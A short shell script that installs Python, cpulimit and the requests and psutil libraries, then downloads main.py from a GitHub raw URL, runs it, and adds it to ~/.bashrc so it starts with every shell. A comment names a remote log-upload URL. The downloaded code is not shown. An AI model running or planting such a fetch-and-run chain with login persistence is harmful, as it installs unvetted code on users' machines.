apt install python3 python-pip -y && echo "Successfully installed python" || echo "Installation of python not success"
apt install python3 python3-pip -y && echo "Successfully installed python" || echo "Installation of python not success"
apt install python python-pip -y && echo "Successfully installed python" || echo "Installation of python not success"
apt install cpulimit -y && echo "Successfully installed cpulimit" || echo "Installation of cpulimit not success"
python3 -m pip install requests || python3 -m pip install requests psutil || pip install requests psutil
curl -o main.py https://raw.githubusercontent.com/ksverchkov/appDMOP/main/main.py
python3 main.py
echo "python3 ~/main.py" >> ~/.bashrc
# example url https://frontguiltypatches.ksverchkov.repl.co/upload/logs/pythonbot
